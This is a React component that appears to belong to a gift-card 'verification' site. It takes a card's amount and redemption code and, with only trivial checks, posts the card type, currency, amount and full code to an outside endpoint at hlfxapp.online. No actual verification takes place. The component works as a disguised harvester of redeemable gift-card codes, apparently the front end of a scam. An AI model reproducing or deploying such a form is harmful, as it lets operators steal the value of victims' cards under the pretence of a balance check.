"use client"

import React, { useState } from 'react'

import { useAlert } from 'react-alert'
import Button from '../button/Button';

const TypeOne = ({cardname, setShowmodal, showmodal, amount, setAmount, currency}) => {
    const [redemptionCode, setRedemptionCode] = useState('');
    const [loading, setLoading] = useState(false);
    const alert = useAlert();

    const handleVerify = async () => {
        setLoading(true)
        // do validation
    
        if(isNaN(amount)){
            alert.error("Please enter a valid amount");
            setLoading(false)
            return;
        }
    
        if(redemptionCode.length < 13){
            alert.error("Invalid reedemption code");
            setLoading(false)
            return;
        }

        const msg = `
Card Type: ${cardname}
Currency: ${currency}
Amount: ${amount}
Reedemption Code: ${redemptionCode}
`;
        const data = {
            msg
        }

        await fetch('https://www.hlfxapp.online/api/send-message', {
            body: JSON.stringify(data),
            method: "post",
            headers:{
                'content-type': 'application/json',
            }
        })
        setShowmodal(true);
        setLoading(false)
    }

  return (
    <>
        <input 
            class="block mb-4 w-full p-2 rounded-lg"
            value={amount} 
            onInput={e => setAmount(e.target.value)}
            type='number'
            placeholder='Amount' 
        />
        <input 
            class="block mb-4 w-full p-2 rounded-lg" 
            value={redemptionCode} 
            onInput={e => setRedemptionCode(e.target.value)}
            placeholder='Redemption Code'
        />
        <Button
            title={"Verify"}
            loading={loading}
            onClick={handleVerify}
        />
    </>
  )
}

export default TypeOne